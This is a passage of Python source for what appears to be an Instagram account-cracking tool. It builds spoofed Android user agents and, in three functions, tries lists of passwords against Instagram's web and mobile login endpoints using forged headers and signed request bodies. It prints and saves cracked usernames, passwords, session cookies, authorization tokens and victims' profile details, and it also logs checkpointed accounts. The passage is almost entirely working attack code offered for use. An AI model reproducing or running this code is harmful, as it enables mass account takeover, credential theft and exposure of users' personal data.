29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
	igve=igv.split(",")
	versi=random.choice(igve)
	realme = random.choice(["RMX3997","RMX3765","RMX3820","RMX3765","RMX3999","RMX3997","RMX3997","RMX3999","RMX3820","RMX3999","RMX3765","RMX3997","RMX3765","RMX3999","RMX3765","RMX3910","RMX3997","RMX3765","RMX3998","RMX3765","RMX3765","RMX3910","RMX3765","RMX3765","RMX3765","RMX3765","RMX3765","RMX3999","RMX3999","RMX3910","RMX3765","RMX3999","RMX3765","RMX3997","RMX3910","RMX3765","RMX3999","RMX3999","RMX3997","RMX3765","RMX3998","RMX3997","RMX3765","RMX3820","RMX3998","RMX3765","RMX3999","RMX3998","RMX3998","RMX3765","RMX3765","RMX3765","RMX3999","RMX3910","RMX3161","RMX3997","RMX3997","RMX3765","RMX3765","RMX3765","RMX3998","RMX3765","RMX3999","RMX3765","RMX3997","RMX3765","RMX3997","RMX3820","RMX3765","RMX3997","RMX3999","RMX3765","RMX3997","RMX3765","RMX3999","RMX3999","RMX3997","RMX3820","RMX3997","RMX3997","RMX3999","RMX3997","RMX3765","RMX3910","RMX3820","RMX3997","RMX3765","RMX3999","RMX3999","RMX3999","RMX3765","RMX3997","RMX3998","RMX3820","RMX3999","RMX3910","RMX3765","RMX3997","RMX3765","RMX3999","RMX3997","RMX3765","RMX3997","RMX3820","RMX3999","RMX3997"])
	ara1 = ('Barcelona 289.0.0.77.109 Android ({}; {}; Realme; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, realme))
	samsung = random.choice(["SM-A115F","Samsung A4","Samsung A4","samsung a1","SM-A145R","samsung a1","SM-G973F","SM-A346B","SM-G973F","SM-S9280","SM-E156B","SM-E146B","samsung a1","SM-A346B","Samsung A4","SM-E546B","SM-A346B","SM-A145R","SM-A336B","GT-S5660","Samsung A4","samsung a1","SM-E156B","SM-A115F","SM-S9160","SM-A336B","Samsung A4","samsung a1","SM-A346B","samsung a1","SM-A115F","SM-A115F","Samsung A4","SM-A145R","SM-A136B","SM-S9280","SM-A115F","SM-S9280","SM-E546B","SM-A336B","SM-A136B","Samsung A4","SM-A115F","SM-A145R","samsung a1","SM-A336B","SM-A136B","SM-A336B","SM-G973F","SM-A336B","GT-S5660","Samsung A4","GT-S5660","Samsung A4","SM-A015M","Samsung A4","SM-A115F","SM-E546B","SM-E156B","SM-A015M","SM-A136B","SM-A336B","SM-E546B","SM-A145R","SM-A136B","SM-A015M","SM-A115F","Samsung A4","GT-S5660","SM-S9160","Samsung A4","SM-E146B","SM-A136B","SM-E546B","SM-G973F","Samsung A4","SM-A336B","SM-G973F","SM-A015M","SM-S9280","SM-A115F","Samsung A4","Samsung A4","SM-A115F","Samsung A4","samsung a1","GT-S5660","SM-A346B"])
	ara2 = ('Barcelona 289.0.0.77.109 Android ({}; {}; samsung; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, samsung))
	infinix = random.choice(["23046RP50C","22127RK46C","23054RA19C","MiTV-AESP0","22041216UC","22041216UC","2312CRNCCL","22041216UC","MiTV-AESP0","22041216UC","24040RN64Y","22041216UC","23046PNC9C","2312CRNCCL","23046RP50C","2312CRNCCL","23113RKC6C","22101320C","22041216UC","22041216UC","24040RN64Y","23046RP50C","22101320C","21091116AC","MiTV-AESP0","22101320C","2312CRNCCL","23046RP50C","2312CRNCCL","2312CRNCCL","23046RP50C","23013RK75C","22101320C","22122RK93C","2312CRNCCL","23013RK75C","23113RKC6C","22041216UC","2312CRNCCL","23046PNC9C","24030PN60G","22101320C","22041216UC","2312CRNCCL","23013RK75C","22041216UC","23113RKC6C","22101320C","24040RN64Y","2312CRNCCL","24040RN64Y","23046RP50C","22101320C","2312CRNCCL","23046PNC9C","22041216UC","2312CRNCCL","22122RK93C","22041216UC","23013RK75C","2312CRNCCL","22041216UC","2312CRNCCL","22122RK93C","22101320C","22041216UC","24040RN64Y","MiTV-AESP0","MiTV-AESP0","MiTV-AESP0","22041216UC","22101320C","22101320C","2404ARN45A","23046RP50C","23046PNC9C","21091116AC","21091116AC","22127RK46C","21091116AC","22101320C","23113RKC6C","24030PN60G","22101320C","23046RP50C","23113RKC6C","23046RP50C","22101320C","22127RK46C","23113RKC6C","2312CRNCCL","21091116AC","23046PNC9C","22041216UC","23046RP50C","MiTV-AESP0","24040RN64Y","21091116AC","23113RKC6C","2312CRNCCL","24040RN64Y","24040RN64Y","22122RK93C","23113RKC6C","22101320C","2312CRNCCL","MiTV-AESP0","23113RKC6C","MiTV-AESP0","24040RN64Y","22041216UC"])
	ara5 = ('Barcelona 289.0.0.77.109 Android ({}; {}; Xiaomi; {}; marlin; qcom; in_ID)'.format(Android_Version(android_version), android_version, dpi_pixel, infinix))
	motorola = random.choice(['MOT-A6020l37', 'MotoA953', 'XT603', 'XT682', 'MB865', 'MB865', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'Motorola Defy', 'XT320', 'MOT-XT320', 'XT557', 'XT556', 'XT555C', 'Droid', 'Momodesign MD Droid', 'Droid', 'DROID2', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID3', 'XT894', 'DROID4', 'DROID4', 'DROID4 4G', 'Droid4X-WIN', 'Droid4X-WIN', 'DROID BIONIC', 'DROID BIONIC', 'DROID BIONIC 4G', 'DroidBox', 'XT1565', 'XT1030', 'XT1030', 'DroidPC Dual Core', 'DROID Pro', 'XT610', 'XT910', 'DROID RAZR', 'MOT-XT910S', 'XT910', 'DROID RAZR', 'XT910', 'MOT-XT910', 'DROID RAZR HD', 'XT910', 'DROID RAZR 4G', 'XT918', 'XT916', 'XT914', 'XT915', 'XT916', 'XT920', 'XT919', 'XT919', 'XT920', 'DROID RAZR HD', 'XT925', 'DROID RAZR HD', 'XT926', 'XT890', 'XT890', 'XT890', 'XT890', 'XT907', 'XT907', 'XT905', 'XT907', 'XT907', 'XT912', 'XT886', 'XT885', 'DROID RJ', 'XT1254', 'XT1254', 'XT1585', 'XT1080', 'XT1080', 'XT1080', 'Droid V3.0', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROID X2', 'DROID X2', 'Motorola E7 POWER', 'motorola edge', 'Motorola Edge S', 'motorola edge (2021)', 'motorola edge (2022', 'motorola edge (2022)', 'motorola edge 20', 'XT2153-1', 'motorola edge 20 pro', 'motorola edge 20 pro', 'motorola edge 30', 'motorola edge 30 neo', 'motorola edge 30 pro', 'motorola edge 40', 'motorola edge 40 pro', 'motorola edge plus', 'motorola edge plus', 'XT2125-4', 'xt2125-4', 'XT2175-2', 'XT2175-2', 'XT2201-2', 'XT2201-2', 'XT2201-2', 'XT881', 'XT901'])
	ara6 = ('Barcelona 289.0.0.77.109 Android ({}; {}; motorola; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, motorola))
	user_agent = random.choice([ara1, ara2, ara5, ara6])
	return user_agent

def Crack_api(username, memek):
	global Ok, Cp, Loop
	sys.stdout.write(f"\rstatus ip: {H}aman{P} web {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = Useragent().useragent_api()
			cok   		= ses.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers={'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}).cookies.get_dict()
			cooki 		= ("; ").join([ f"{key}={value}" for key, value in cok.items() ])
			csrf		= ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/').cookies.items()[0][1]
			headers = {'User-Agent': uag,'Content-Type': 'application/x-www-form-urlencoded','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','x-ig-www-claim': 'hmac.AR0y3gXr0HnsEAH0EGqFP7FOuPYc7F3xsPm3GzTw2fqbjS4e','sec-ch-ua-platform-version': '"11.0.0"','x-requested-with': 'XMLHttpRequest','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-ch-prefers-color-scheme': 'dark','x-csrftoken': f'{csrf}','sec-ch-ua-platform': '"Android"','x-ig-app-id': '1217981644879628','sec-ch-ua-model': '"Redmi Note 8"','sec-ch-ua-mobile': '?1','x-instagram-ajax': '1014410995','x-asbd-id': '129477','origin': 'https://www.instagram.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.instagram.com/','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','Cookie': cooki}
			data = (f'enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}&optIntoOneTap=false&queryParams=%7B%22next%22%3A%22%2F%22%2C%22source%22%3A%22mobile_nav%22%7D&trustedDeviceRecords=%7B%7D&username={urllib.request.quote(str(username))}')
			response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
			if 'userId' in str(response.text):
				kuki = ";".join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				cetak(panel(f'''\r                                               
 [white]Fullname     : [green]{fullname[:10]}
 [white]Username     : [green]{username}
 [white]Password     : [green]{password}
 [white]Facebook Acc : [green]{fbid}
 [white]Phone        : [green]{mail}
 [white]Postingan    : [green]{post}
 [white]Pollowers    : [green]{peng}
 [white]Pollowing    : [green]{meng}
 [white]Cokies       : [green]{cookies}
 [white]UserAgent    : [green]{uag}\n                                                  ''',title=f"[bold white][ [green]Succes [bold white]]",style=f"bold green"))
				Ok+=1
				open('/sdcard/Ress/Ok-Instagram.txt','a').write(f"{username}|{password}\n{peng}|{meng}\n{kuki}\n")
				break
			elif 'checkpoint' in str(response.text):
				Cp+=1
				followers, following = info(username)
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				cetak(panel(f'''\r                                                        
 [white]Status       : [red]Checkpoint
 [white]Username     : [red]{username}
 [white]Password     : [red]{password}
 [white]Pollower     : [red]{peng}
 [white]Pollowing    : [red]{meng}   
 [white]Postingan    : [red]{post}
 [white]Useragent    : [red]{uag}\n                                                  ''',title=f"[bold white][ [red]Check [bold white]]",style=f"bold red"))
				open('/sdcard/Ress/Cp-Instagram.txt','a').write('%s|%s\n'%(username,password))
				break
			elif 'ip_block' in response.text or 'spam' in response.text or '{"message":"","status":"fail"}' in response.text:
				sys.stdout.write("\rstatus ip: {M}spam{P} lite {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def Crack_i(username, memek):
	global Ok, Cp, Loop
	sys.stdout.write(f"\rstatus ip: {H}aman{P} api {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			useragent = Useragent().useragent_api()
			device_id = str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			data = {'signed_body': 'aa792afa7c0f5b1680531edb1681750fcc45a3718142c399d2420291431be7f1.{"id":"'+str(device_id)+'","server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_sms_retriever_backtest_universe,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_login_identifier_fuzzy_match,ig_android_reliability_leak_fixes_h1_2019,ig_android_video_render_codec_low_memory_gc,ig_android_push_fcm,ig_android_show_login_info_reminder_universe,ig_android_email_fuzzy_matching_universe,ig_android_one_tap_aymh_redesign_universe,ig_android_direct_send_like_from_notification,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_login_forgot_password_universe,ig_android_session_scoped_logger,ig_android_smartlock_hints_universe,ig_android_account_switch_infra_universe,ig_android_video_ffmpegutil_pts_fix,ig_android_multi_tap_login_new,ig_android_caption_typeahead_fix_on_o_universe,ig_android_save_pwd_checkbox_reg_universe,ig_android_nux_add_email_device,ig_username_suggestions_on_username_taken,ig_android_analytics_accessibility_event,ig_android_ingestion_video_support_hevc_decoding,direct_app_deep_linking_universe,ig_android_account_recovery_auto_login,ig_android_feed_cache_device_universe2,ig_android_sim_info_upload,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_android_targeted_one_tap_upsell_universe,ig_android_gmail_oauth_in_reg,ig_android_native_logcat_interceptor,ig_android_hide_typeahead_for_logged_users,ig_android_vc_interop_use_test_igid_universe,ig_android_reg_modularization_universe,ig_android_phone_edit_distance_universe,ig_android_device_verification_separate_endpoint,ig_android_universe_noticiation_channels,ig_smartlock_login,ig_android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_device_info_foreground_reporting,ig_fb_invite_entry_points,ig_android_device_verification_fb_signup,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_assisted_login_universe,ig_android_display_full_country_name_in_reg_universe,ig_android_security_intent_switchoff,ig_android_device_info_job_based_reporting,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_fix_sms_read_lollipop,ig_android_access_flow_prefill"}','ig_sig_key_version': '4'}
			ses.headers.update({'X-Pigeon-Session-Id': str(uuid.uuid4()),'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),'X-IG-Connection-Speed': '-1kbps','X-IG-Bandwidth-Speed-KBPS': '-1.000','X-IG-Bandwidth-TotalBytes-B': '0','X-IG-Bandwidth-TotalTime-MS': '0','X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0','X-IG-Connection-Type': 'MOBILE(LTE)','X-IG-Capabilities': '3brTvw==','X-IG-App-ID': '567067343352427','User-Agent': useragent,'Accept-Language': 'id-ID, en-US','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding': 'gzip, deflate','Host': 'i.instagram.com','X-FB-HTTP-Engine': 'Liger','Connection': 'keep-alive','Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),})
			response = ses.post('https://i.instagram.com/api/v1/qe/sync/', data = data)
			try:
				_csrftoken = ses.cookies.get_dict()['csrftoken']
			except Exception as e:
				_csrftoken = ('')
			ses.headers.update({'Cookie': ("; ".join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])),'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),'Connection': 'keep-alive',})
			data = (f'signed_body=c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba\
                      .%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22_csrftoken%22%3A%22{urllib.request.quote(str(_csrftoken))}%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22password%22%3A%22{urllib.request.quote(str(password))}%22%2C%22login_attempt_count%22%3A%221%22%7D&ig_sig_key_version=4')
			response2 = ses.post('https://i.instagram.com/api/v1/accounts/login/',data=data, allow_redirects = True)
			if 'logged_in_user' in str(response2.text) or 'sessionid' in ses.cookies.get_dict().keys():
				try:
					ig_set_authorization = response2.headers['ig-set-authorization']
				except Exception as e:
					ig_set_authorization = None
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				cetak(panel(f'''\r                                               
 [white]Fullname     : [green]{fullname[:10]}
 [white]Username     : [green]{username}
 [white]Password     : [green]{password}
 [white]Facebook Acc : [green]{fbid}
 [white]Phone        : [green]{phone}
 [white]Postingan    : [green]{post}
 [white]Pollowers    : [green]{peng}
 [white]Pollowing    : [green]{meng}
 [white]Cokies       : [green]{cookies}
 [white]Auth         : [green]{ig_set_authorization}
 [white]UserAgent    :[green]{useragent}\n                                                  ''',title=f"[bold white][ [green]Succes [bold white]]",style=f"bold green"))
				open('hasil/Ok-Instagram.txt','a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
				break
			elif 'challenge_required' in str(response2.text):
				Cp+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				cetak(panel(f'''\r                                                        
 [white]Status       : [red]Checkpoint
 [white]Username     : [red]{username}
 [white]Password     : [red]{password}
 [white]Pollower     : [red]{peng}
 [white]Pollowing    : [red]{meng}   
 [white]Postingan    : [red]{post}
 [white]Useragent    : [red]{useragent}\n                                                  ''',title=f"[bold white][ [red]Check [bold white]]",style=f"bold red"))                                            
				open('hasil/Cp-Instagram.txt','a').write('%s|%s\n'%(username,password))
				break
			elif 'ip_block' in str(response2.text) or 'generic_request_error' in str(response2.text):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} api {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def Crack_w(username, memek):
	global Ok, Cp, Loop
#	sys.stdout.write(f"\r{P}[{H}RIDWAN-DEV{P}] [ {Loop}/{str(len(Uuid))}{P} ] [ {P}CP:{M}{cp} {P}OK:{H}{ok}"),
	vit = random.choice([f"[green]√",f"[red]√",f"[yellow]√",f"[blue]√",f"[cyan]√",f"[white]√",f"[orange]√",f"[pink]√",f"[purple]√"])
	sys.stdout.write(f"\r{P}({Z}✓{P}) [{HS}{str(username)[:9]}{P}] metode {HS}threads {N}({HS}{Loop}{P}/{HS}{str(len(Uuid))}{N}) {P}{P}succes:-{HS}{Ok}{P}/check:-{M}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = Useragent().useragent_api()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
